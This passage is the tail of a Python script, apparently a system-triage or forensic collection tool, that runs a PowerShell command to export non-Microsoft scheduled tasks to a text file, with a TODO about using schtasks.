        step +=1
        menu_cmd(step, [main_command], 'not_user_processes.txt', 'nonuserprocesses', cmdlang)

        # - Getting the remote machine's scheduled tasks.
        main_command = 'powershell "Get-ScheduledTask | Select-object TaskName, TaskPath, State | where {$_.TaskPath -notlike \'\\Microsoft*\'}'
        main_command += ' | ConvertTo-Csv -NoTypeInformation | Select-Object -Skip 1 | Set-Content <output_file>"'

        # TODO:PERFORM THE SAME OPERATION ABOVE WITH THE SCHTASKS TOOL
        #DOS_command = 'schtasks'
        #wmic_command = 'wmic /OUTPUT:<output_file> PROCESS LIST'
        commands = [main_command]

        print()
        step +=1
        menu_cmd(step, [main_command], 'scheduledtasks.txt', 'scheduledtasks', cmdlang)



        # Exiting program..
        exit_program()


if __name__ == '__main__':
    main()
